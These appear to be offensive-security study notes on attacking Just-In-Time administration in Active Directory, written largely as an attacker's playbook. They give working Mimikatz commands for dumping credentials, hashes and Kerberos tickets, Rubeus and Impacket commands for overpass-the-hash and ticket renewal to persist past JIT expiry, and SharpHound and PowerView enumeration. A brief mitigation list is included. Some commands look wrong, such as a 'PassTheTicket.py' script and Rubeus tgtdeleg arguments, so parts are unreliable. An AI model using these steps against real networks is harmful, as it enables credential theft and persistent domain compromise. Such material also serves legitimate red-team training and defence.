
### **Just-In-Time (JIT) Administration Theory**

**Just-In-Time (JIT) administration** is a security model that provides **temporary, elevated privileges** to users or services **on-demand** and for a limited period. This model helps minimize the exposure of privileged accounts to reduce the attack surface in an Active Directory (AD) environment or any IT infrastructure. By implementing JIT, organizations aim to reduce the risk of privilege abuse or credential theft, as admin accounts aren’t permanently active, limiting attackers' access windows to sensitive resources.

#### **Core Principles of JIT Administration**
1. **Minimal Exposure**: Accounts with administrative privileges remain inactive by default and are only elevated when needed, reducing the likelihood of compromise.
2. **Temporary Privileges**: Users are granted elevated access for a set period and automatically lose it afterward.
3. **On-Demand Access**: Access to privileged roles is provided upon request, which can be approved manually or automatically based on pre-defined policies.
4. **Auditing and Monitoring**: All privilege escalations are logged, providing a clear trail of who accessed what and when.
5. **Reduced Attack Surface**: By limiting the time and scope of privileged access, JIT reduces the opportunity for attackers to compromise administrative credentials.

### **Implementation of JIT Administration**

JIT administration can be implemented through various security tools and models, with some of the most common being:
- **Privileged Access Management (PAM) solutions** (e.g., Microsoft Privileged Access Management in AD, CyberArk, BeyondTrust, etc.)
- **Active Directory Administrative Tier Models**
- **Microsoft's Azure AD PIM (Privileged Identity Management)**

These tools create workflows where users or services request elevated access, which can be granted based on approval workflows, automatic policies, or the current security posture.

---

### **JIT Administration Enumeration**

Enumerating JIT configurations involves discovering where and how temporary privileges are granted in the AD environment. This is typically done by querying **privileged access accounts**, **PAM systems**, and associated **policies** that govern temporary privilege escalation.

#### **Tools for Enumeration:**
- **PowerShell**
  - `Get-ADUser`, `Get-ADGroup`: To list privileged users and groups.
  - `Get-ADAccountAuthorizationGroup`: To identify what groups a user belongs to and check if they have JIT access rights.
- **PowerView**: Can be used to enumerate users and groups with potential JIT access.

#### **Key Areas to Enumerate:**
1. **Privileged AD Groups**:
   - `Enterprise Admins`
   - `Domain Admins`
   - `Backup Operators`
   - `Account Operators`
   
   **PowerShell Example:**
   ```powershell
   Get-ADGroupMember -Identity "Domain Admins"
   ```

2. **PAM (Privileged Access Management) Configuration**:
   - Check if JIT policies are implemented in the organization’s PAM solutions.
   - **PAM configurations** typically store JIT privileges.

3. **Azure AD PIM**:
   - If using Azure, query for Privileged Identity Management roles and assignments.

#### **Privileged Accounts to Check:**
- Service accounts with elevated privileges.
- Local administrators who might have their access temporarily elevated to domain-wide roles.
  
| Privileged Group         | Role                             | Temporary Access Role (JIT) |
|--------------------------|----------------------------------|-----------------------------|
| Domain Admins            | Full domain-level administration | Temporary domain privileges |
| Backup Operators         | Backup and restore privileges    | Temporary access to backup systems |
| Azure Global Administrators | Azure AD full access            | Temporary Azure admin access |
| Server Admins            | Local server administration      | On-demand server access      |

---

### **Exploitation of JIT Administration**

Exploitation of JIT configurations involves identifying weaknesses or misconfigurations in the way temporary privileges are granted. Common avenues for exploitation include:
- **Abusing privileged groups** to escalate permissions temporarily and maintain persistence.
- **Hijacking approval workflows** if JIT privileges are granted automatically or based on weak policies.
- **Targeting the account that holds the JIT roles** or access tokens used for temporary elevation.

#### **Attack Scenarios:**

1. **Hijacking a JIT-Privileged Session**:
   - **Scenario**: An attacker gains control of a user account or service with a temporarily elevated privilege.
   - **Attack**: If the account is currently in a JIT-privileged session, the attacker can leverage that session to perform administrative actions within the allowed timeframe.
   
   **Example Steps**:
   - Attacker compromises a service account that has JIT privileges to escalate to `Domain Admin`.
   - Uses the session to install backdoors, extract sensitive data, or create new accounts with elevated access.

2. **Abusing Scheduled Tasks for Privilege Escalation**:
   - **Scenario**: JIT is configured to provide temporary privileges based on schedules (e.g., nightly backup tasks).
   - **Attack**: The attacker compromises a service or account that is part of a scheduled task granting JIT privileges and triggers the task to immediately elevate their access.

   **Example Command**:
   ```powershell
   schtasks /run /tn "TaskWithElevatedAccess"
   ```

3. **Misconfigured Approval Process**:
   - **Scenario**: In many PAM or PIM systems, administrators can set rules for automatic approval of JIT privilege requests.
   - **Attack**: An attacker could abuse a weak approval process (e.g., no multi-factor authentication or weak policies) to gain JIT privileges without needing explicit approval from a privileged user.

4. **Persisting Using Cached Credentials or Tickets**:
   - **Scenario**: After gaining JIT privileges, an attacker can create a cached credential or Kerberos ticket to extend the lifetime of their elevated access even after the JIT window expires.
   - **Attack**: Tools like **Mimikatz** can be used to extract Kerberos tickets or credentials for reuse.
   
   **Mimikatz Example**:
   ```bash
   sekurlsa::tickets
   ```

#### **Tools for Exploiting JIT Systems:**

| Tool          | Purpose                                           | Example Use Case                            |
|---------------|---------------------------------------------------|---------------------------------------------|
| **Mimikatz**  | Dump credentials and Kerberos tickets             | Extract tickets to maintain persistence     |
| **SharpHound**| Enumerate privileged users and JIT configurations | Map JIT access routes to sensitive systems  |
| **PowerView** | Enumerate AD roles, users, and groups             | Find misconfigured JIT-privileged accounts  |
| **Rubeus**    | Kerberos ticket manipulation                      | Abuse Kerberos tickets for extended access  |

---

### **Example Attack Workflow**

Let's simulate an attack where an adversary exploits JIT administration to elevate privileges and maintain access:

#### **Step 1: Enumerate JIT Privileged Accounts**
The attacker enumerates users and groups with potential JIT access.
```powershell
Get-ADGroupMember -Identity "Domain Admins"
```

#### **Step 2: Compromise a JIT-Privileged Account**
The attacker targets and compromises a low-level user account, realizing that it has JIT privileges to escalate to a domain admin.
- The attacker requests JIT elevation, potentially abusing a weak approval process.

#### **Step 3: Perform Privileged Operations**
Once the account gains temporary domain admin privileges, the attacker:
- Exfiltrates sensitive data.
- Creates new privileged accounts for future use.

#### **Step 4: Maintain Persistence Using Kerberos Tickets**
The attacker uses **Mimikatz** to dump the Kerberos ticket from the JIT-privileged session.
```bash
mimikatz.exe "privilege::debug" "sekurlsa::tickets" "exit"
```
The ticket is then reused later to maintain access even after the JIT window expires.

---

### **Mitigating JIT Administration Exploitation**

1. **Enforce Strong Approval Policies**: Ensure that requests for JIT elevation require manual approval from multiple administrators.
2. **Use MFA**: Require multi-factor authentication for JIT privilege requests and approvals.
3. **Limit Lifetime of Tickets**: Implement short lifetimes for Kerberos tickets to reduce the effectiveness of ticket re-use attacks.
4. **Monitor Privileged Access**: Regularly audit JIT elevations and monitor for suspicious activity using Security Information and Event Management (SIEM) tools.

By implementing these controls, the risk of JIT administration exploitation can be significantly reduced.

---

Exploitation of Just-In-Time (JIT) administration typically involves leveraging various security tools to enumerate, exploit, and persist within an environment. Attackers focus on identifying misconfigurations or weaknesses in privilege elevation workflows, and then use these tools to gain unauthorized access or maintain elevated privileges.

Let’s break down the most commonly used tools for JIT exploitation, how they work, and examples of their use in exploiting JIT-related configurations in an Active Directory (AD) environment.

---

### **1. PowerView**

#### **Purpose**: 
PowerView is a PowerShell tool used to enumerate and manipulate Active Directory environments. It helps attackers identify privileged accounts, domain trusts, and potential attack paths in AD.

#### **Use in JIT Exploitation**:
- **Enumeration**: PowerView is excellent for identifying accounts with elevated privileges and potential JIT access configurations.
- **Discovery of Privileged Users and Groups**: You can use PowerView to list privileged groups (e.g., Domain Admins) and users with elevated access.
  
#### **Example Commands**:
- **Find all Domain Admins**:
    ```powershell
    Get-DomainGroupMember -Identity "Domain Admins"
    ```
  
- **List all sensitive AD groups and their members**:
    ```powershell
    Get-DomainGroupMember -GroupName "Enterprise Admins", "Domain Admins", "Account Operators", "Backup Operators"
    ```

- **Identify accounts with temporary elevation privileges**:
    ```powershell
    Get-DomainUser -AdminCount 1
    ```

PowerView can be used to explore potential attack paths to privileged accounts or misconfigured permissions in AD that might allow attackers to request JIT access.

#### **Key Functions in PowerView**:
| Function                    | Description |
|------------------------------|-------------|
| `Get-DomainUser`              | Enumerate users in AD with detailed attributes |
| `Get-DomainGroupMember`       | Identify members of high-value groups (e.g., Domain Admins) |
| `Get-DomainObjectAcl`         | Enumerate ACLs (Access Control Lists) for users and computers |
| `Invoke-ACLScanner`           | Identify misconfigurations in AD objects' ACLs |

---

### **2. SharpHound (BloodHound)**

#### **Purpose**: 
SharpHound is the data collector for **BloodHound**, a popular tool used to analyze Active Directory relationships and permissions. BloodHound enables attackers to map privilege escalation paths by identifying potential abuse of AD object relationships.

#### **Use in JIT Exploitation**:
- **Attack Path Discovery**: SharpHound can identify users or groups that have direct or indirect access to privileged accounts.
- **Privileged Group Mapping**: By analyzing the relationships between JIT-privileged users and systems, attackers can find paths to compromise accounts with JIT roles.
  
#### **Example Scenarios**:
- **Find paths to Domain Admins**: SharpHound collects AD object data (users, groups, permissions) and uses BloodHound to visualize potential attack paths, e.g., from a compromised user to a JIT-privileged Domain Admin account.

#### **SharpHound Data Collection**:
SharpHound collects data by querying AD for:
1. **Group memberships** (who has access to what).
2. **ACLs** on sensitive objects.
3. **Session information** (who is logged into what).
4. **Kerberos delegation rights**.

- **Running SharpHound**:
    ```bash
    SharpHound.exe -c All
    ```

- **Sample BloodHound Query for Domain Admins Attack Paths**:
    - **Shortest Paths to Domain Admins**:
    ```bash
    MATCH p=shortestPath((u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS"})) RETURN p
    ```

#### **Post-Exploitation with SharpHound/BloodHound**:
- Once you identify an attack path in BloodHound (e.g., compromised user A can escalate to Domain Admin via indirect group memberships), you can target JIT roles by requesting or hijacking temporary privileges along the path.

---

### **3. Mimikatz**

#### **Purpose**: 
Mimikatz is a well-known post-exploitation tool used to dump credentials, manipulate Kerberos tickets, and abuse security features like JIT administrative privileges.

#### **Use in JIT Exploitation**:
- **Kerberos Ticket Manipulation**: Once JIT privileges are granted, attackers can use Mimikatz to extract and persist Kerberos tickets.
- **Credential Dumping**: If an account with JIT privileges has been used to authenticate, Mimikatz can extract the corresponding credentials, allowing attackers to replay them.
  
#### **Key Commands in JIT Exploitation**:
- **Dumping Kerberos Tickets**: If an attacker compromises an account with JIT privileges, they can dump the Kerberos tickets and replay them later to maintain access.
    ```bash
    mimikatz "privilege::debug" "sekurlsa::tickets" exit
    ```

- **Extracting NTLM Hashes**: After gaining access to a privileged session, Mimikatz can be used to dump NTLM hashes.
    ```bash
    mimikatz "privilege::debug" "lsadump::lsa /patch" exit
    ```

#### **Persistence with Kerberos Tickets**:
- Attackers can reuse extracted Kerberos tickets, even after the JIT window expires, by renewing or forwarding them to maintain elevated access:
    ```bash
    mimikatz "kerberos::ptt <ticket.kirbi>"
    ```

---

### **4. Rubeus**

#### **Purpose**: 
Rubeus is a post-exploitation tool used for Kerberos ticket operations, similar to Mimikatz but with additional features for ticket renewal and manipulation.

#### **Use in JIT Exploitation**:
- **Abuse of Kerberos Tickets**: Rubeus allows attackers to request or renew Kerberos tickets once they have JIT privileges. Attackers can also request tickets for other users by exploiting delegation.
- **Persistence via Ticket Renewal**: Once JIT privileges expire, an attacker can extend their access by requesting ticket renewals.

#### **Example Commands**:
- **Requesting a TGT (Ticket Granting Ticket)** for a JIT-privileged user:
    ```bash
    Rubeus.exe tgtdeleg /user:JITAdminUser /rc4:passwordhash
    ```

- **Renewing a Kerberos Ticket** to extend JIT privileges:
    ```bash
    Rubeus.exe renew /ticket:<ticket.kirbi>
    ```

- **Overpass-the-Hash Attack**: After dumping NTLM hashes with Mimikatz, Rubeus can use the hash to request a TGT:
    ```bash
    Rubeus.exe asktgt /user:targetUser /rc4:hash /domain:target.domain.com
    ```

#### **Scenario**:
An attacker compromises a user account that has temporary JIT access to a Domain Admin role. They use **Rubeus** to request a TGT, allowing them to perform privileged actions until the TGT expires, bypassing the JIT expiration window.

---

### **5. Impacket**

#### **Purpose**: 
Impacket is a collection of Python scripts used to interact with network protocols, particularly in Active Directory environments. It is highly useful for post-exploitation activities, especially related to Kerberos and SMB (Server Message Block).

#### **Use in JIT Exploitation**:
- **Kerberos Ticket Operations**: Impacket’s tools can be used to manipulate Kerberos tickets, replay them, and authenticate as JIT-privileged accounts.
- **SMB Relay Attacks**: Impacket’s tools, such as `smbrelayx`, allow attackers to relay credentials or Kerberos tickets to maintain persistence after JIT privileges expire.

#### **Key Impacket Tools for JIT Exploitation**:
- **`GetTGT.py`**: Requests a TGT for a compromised JIT-privileged user.
    ```bash
    GetTGT.py domain/username -hashes :ntlmhash
    ```

- **`PassTheTicket.py`**: Replays a Kerberos ticket for a JIT-privileged account.
    ```bash
    PassTheTicket.py domain/username -ticket tgt.kirbi
    ```

- **`smbrelayx.py`**: Exploits SMB relays, which can be useful in an environment where SMB signing is disabled and attackers want to persist after JIT escalation.
  
---

### **6. Cobalt Strike**

#### **Purpose**: 
Cobalt Strike is a full-featured attack framework used by advanced attackers to conduct post-exploitation activities, including privilege escalation and persistence in AD environments.

#### **Use in JIT Exploitation**:
- **Abusing Privileged Access**: Once attackers have access to JIT-privileged accounts, Cobalt Strike allows them to escalate privileges, manipulate Kerberos tickets, and create persistence mechanisms (e.g., user accounts with elevated privileges).
  
#### **Scenario**:
An attacker compromises a user with JIT-admin privileges. They create a **beacon** session in Cobalt Strike, allowing them to run Mimikatz, SharpHound, or PowerView to explore and exploit additional AD misconfigurations.

Cobalt Strike also integrates with **Kerberos ticket attacks**, allowing for easy manipulation of Kerberos tickets in memory to persist or escalate privileges.

---

### **Summary of Tools and Use Cases in JIT Exploitation**


|**Tool**|**Purpose**|**Example Use Case**|
|---|---|---|
|**PowerView**|AD enumeration and privilege mapping|Identify users with temporary elevated access|
|**SharpHound**|Attack path discovery for AD privilege escalation|Find paths to JIT-privileged users and groups|
|**Mimikatz**|Credential dumping and Kerberos ticket manipulation|Dump Kerberos tickets after JIT privileges are granted|
|**Rubeus**|Kerberos ticket operations (renewal, delegation, etc.)|Extend access after JIT window expires|
|**Impacket**|SMB and Kerberos ticket exploitation tools|Replay Kerberos tickets or perform SMB relays|
|**Cobalt Strike**|Full-featured attack framework for post-exploitation|Leverage beacons for ongoing exploitation of JIT users|

Each tool plays a unique role in the exploitation of JIT administration. By combining these tools in a real-world scenario, attackers can identify weak JIT configurations, escalate privileges, and persist in an Active Directory environment.

### **Just-in-Time (JIT) Administration Attack Scenario**

#### **Overview of JIT Administration:**

Just-in-Time (JIT) Administration is a security practice designed to limit the window of privilege access by dynamically granting elevated permissions to users for a short period. After this period, the access is automatically revoked. JIT is typically implemented to reduce the attack surface by limiting the time a user has administrative privileges, often seen in Microsoft’s **Privileged Access Management (PAM)** or similar privilege control systems.

However, if misconfigured, attackers can exploit JIT administration to elevate privileges during the JIT window and then maintain access beyond the granted time.

### **JIT Attack Scenario: Exploiting Privileged Access Management (PAM)**

#### **Scenario Overview:**

You are an attacker who has compromised a low-privileged user account in a domain with Just-in-Time (JIT) administrative access enabled via **Microsoft Privileged Access Management (PAM)**. Your goal is to exploit the JIT access window granted to a privileged account to perform further actions, such as credential dumping and escalating privileges across the network.

---

### **Step 1: Enumeration of JIT-Privileged Users**

Once you have gained access to a low-privileged machine or user account, you can use **PowerView** to enumerate accounts that are assigned JIT privileges. These accounts might have temporary administrative access, making them attractive targets.

#### **Command: Enumerate Privileged Access Management (PAM) Users**

```powershell
Get-DomainUser -AdminCount 1 | Select-Object Name, DistinguishedName, MemberOf
```

This command will list users who are considered privileged (marked with `AdminCount = 1`) and may be eligible for JIT administrative access.

Alternatively, to find accounts with temporary administrative privileges via JIT:

```powershell
Get-DomainGroup -Identity "Tier 0 Admins" | Get-DomainGroupMember
```

This command will retrieve members of a high-privilege group, which might include users who have JIT administrative rights.

#### **Target**: User accounts granted temporary administrative access.

---

### **Step 2: Monitoring and Coercing JIT Privileged Accounts**

Using tools like **PowerView**, you can look for accounts or service tickets that are being temporarily granted elevated privileges. If you can catch an administrator during their JIT window, you may be able to exploit this access for privilege escalation.

#### **Monitoring for Active JIT Accounts**

You can use PowerView to monitor for Kerberos ticket requests from elevated accounts, especially those associated with JIT privilege roles.

```powershell
Get-WinEvent -FilterHashtable @{logname='Security';id=4769} | Where-Object { $_.Properties[0].Value -like '*krbtgt*' }
```

This script will detect service ticket requests, allowing you to see when an account is accessing high-privilege resources.

---

### **Step 3: Exploit JIT Window with `Mimikatz` to Dump Credentials**

Once you've identified a JIT-privileged account during its access window, you can use **Mimikatz** to extract credentials. This would typically be done on the system where the user logs in or remotely, assuming you have administrative access.

```bash
privilege::debug
sekurlsa::logonpasswords
```

This will extract any Kerberos tickets, NTLM hashes, or plaintext passwords in memory. Since you’re targeting a privileged account with temporary admin access, these credentials can be used to pivot to other systems or maintain access after the JIT window expires.

---

### **Step 4: Persistence After JIT Access Expires**

After dumping credentials, the attacker can maintain access even after the JIT window expires. One way to achieve this is through **Kerberos ticket manipulation** using **Rubeus**. You can steal the current Kerberos **TGT (Ticket-Granting Ticket)** and reuse it to regain access at any time.

#### **Command: Dump TGT with Mimikatz**

```bash
sekurlsa::tickets /export
```

Once the **TGT** is dumped, it can be replayed or renewed to maintain access. Using **Rubeus**, you can renew this ticket to extend the JIT window:

```bash
Rubeus.exe renew /ticket:<path_to_ticket.kirbi>
```

This will extend the lifetime of the JIT access window by renewing the Kerberos ticket associated with the privileged account.

---

### **Step 5: Escalating Privileges and Expanding Access**

Now that you have privileged access, you can use this to escalate privileges further or move laterally across the network. Tools like **SharpHound** (part of **BloodHound**) can be used to discover attack paths from the compromised JIT-privileged user to other high-privilege targets such as domain controllers or Tier 0 administrative accounts.

#### **Using SharpHound to Map Paths to High Privilege Accounts**

```bash
SharpHound.exe -c All
```

This will enumerate all possible attack paths, identifying ways to escalate privileges further. From there, you can look for domain admin or enterprise admin users and identify potential ways to compromise them.

---

### **Summary of Exploitation Steps**

1. **Enumerate JIT users**: Use PowerView to find accounts with temporary administrative access granted via JIT administration.
2. **Monitor Kerberos requests**: Track when these privileged accounts authenticate to high-value targets.
3. **Dump credentials during the JIT window**: Use Mimikatz to extract Kerberos tickets or plaintext credentials when the JIT account is active.
4. **Maintain access post-JIT window**: Use tools like Rubeus to replay or renew Kerberos tickets and extend the JIT access window.
5. **Privilege escalation**: Use SharpHound to identify further attack paths, leading to domain or enterprise admin.

---


In a Just-in-Time (JIT) administration environment, PowerShell can be used to enumerate users or services with JIT-enabled privileges. These users are granted elevated permissions temporarily via systems like Microsoft's **Privileged Access Management (PAM)**. Since JIT users are often members of groups or have roles assigned to them temporarily, the goal of enumeration is to identify these accounts and determine their JIT privileges.

Here's a step-by-step explanation of how you can use PowerShell to find JIT-related users and services in a domain without requiring the Active Directory module.

---

### **PowerShell Enumeration of JIT Administration**

#### **Step 1: Enumerating JIT-Privileged Users via Group Membership**
JIT-privileged users are often temporarily assigned to high-privilege groups (e.g., **Domain Admins**, **Enterprise Admins**, or special PAM/JIT groups). You can enumerate such users by looking at group memberships.

If you're using **PowerView** (from PowerSploit or directly loaded), you can use the following commands to find users in high-privilege groups that could be part of JIT access control.

##### **Enumerating JIT Users in Known Privileged Groups:**
```powershell
# Check for Domain Admins or other privileged groups that may have JIT accounts
Get-DomainGroupMember -Identity "Domain Admins"
Get-DomainGroupMember -Identity "Enterprise Admins"
```

To search for users in specific JIT groups (if the environment uses PAM or a custom JIT group), you can replace the group name with those used for JIT assignments.

```powershell
# Search for JIT users in specific Privileged Access Management (PAM) or custom JIT groups
Get-DomainGroupMember -Identity "Privileged Access Management Users"
```

#### **Step 2: Checking AdminCount for Possible JIT Users**
Users flagged with **AdminCount** might indicate elevated accounts, including those temporarily granted admin rights by JIT mechanisms.

##### **Checking for AdminCount Property:**
```powershell
# Find users who have AdminCount set to 1 (indicating privileged accounts)
Get-DomainUser -AdminCount 1 | Select-Object Name, DistinguishedName
```

This command lists all users marked as admin, including those with temporary privileges granted through JIT mechanisms.

---

### **Step 3: Tracking Temporary JIT Privileges via Kerberos Ticket Requests**
Users granted temporary JIT access will likely be requesting Kerberos service tickets for high-privilege services. You can monitor these requests to identify when they occur and potentially target them during their JIT access window.

##### **Tracking Kerberos Service Ticket Requests in PowerShell:**
```powershell
# Monitor security log for Kerberos service ticket requests (ID 4769)
Get-WinEvent -FilterHashtable @{logname='Security';id=4769} | 
Where-Object { $_.Properties[0].Value -like '*krbtgt*' }
```

This will display Kerberos service ticket requests, which can indicate when JIT-privileged users are accessing high-value services.

---

### **Step 4: Discovering Privileged Access Management (PAM) Policies for JIT**
Microsoft's PAM typically handles JIT administration, which manages time-bound access policies. You can query PAM-related policies using PowerShell to identify which users or services have been granted JIT access.

If you're in an environment where PAM is enabled, you can enumerate privileged roles or policies related to JIT. However, PAM may require specific administrative roles to access directly, so you may be able to gather only limited information unless you have sufficient access.

---

### **Complete PowerView Script for Enumerating JIT Users**

Below is a script that combines the steps above to enumerate JIT users using PowerView.

```powershell
# PowerView script to enumerate JIT users and their privileges

# Enumerate members of critical groups such as Domain Admins or other JIT groups
$privilegedGroups = @("Domain Admins", "Enterprise Admins", "Privileged Access Management Users")

foreach ($group in $privilegedGroups) {
    Write-Host "Enumerating members of group: $group"
    Get-DomainGroupMember -Identity $group | Select-Object Name, MemberOf
}

# Check for users with AdminCount = 1 (indicating privileged accounts, potentially JIT)
Write-Host "Enumerating users with AdminCount set to 1 (potentially JIT accounts)"
Get-DomainUser -AdminCount 1 | Select-Object Name, DistinguishedName

# Track active JIT Kerberos service ticket requests
Write-Host "Monitoring Kerberos service ticket requests from JIT users"
Get-WinEvent -FilterHashtable @{logname='Security';id=4769} | 
Where-Object { $_.Properties[0].Value -like '*krbtgt*' } | 
Select-Object TimeCreated, @{Name="User";Expression={$_.Properties[5].Value}}, @{Name="Service";Expression={$_.Properties[1].Value}}
```

---

### **Step 5: Monitoring Temporary JIT Sessions with RDP or Admin Sessions**
If the JIT administration includes remote desktop access or temporary administrative sessions, you can monitor login events for privileged users. These events may indicate when a user with JIT access logs in and begins their administrative session.

##### **Monitor RDP Logins and Admin Sessions:**
```powershell
# Find logon events (ID 4624) for admin users (look for elevated logins)
Get-WinEvent -FilterHashtable @{logname='Security';id=4624} |
Where-Object { $_.Properties[5].Value -like '*Administrator*' }
```

This command looks for RDP or elevated logins for users with administrative privileges, possibly during a JIT session.

---

### **Conclusion:**
PowerShell and **PowerView** can be used together to enumerate JIT users and services in an Active Directory environment. By identifying users with temporary elevated privileges, monitoring Kerberos requests, and tracking administrative sessions, you can gather information on how JIT is being used within the network and identify potential targets for privilege escalation or lateral movement during the JIT window.

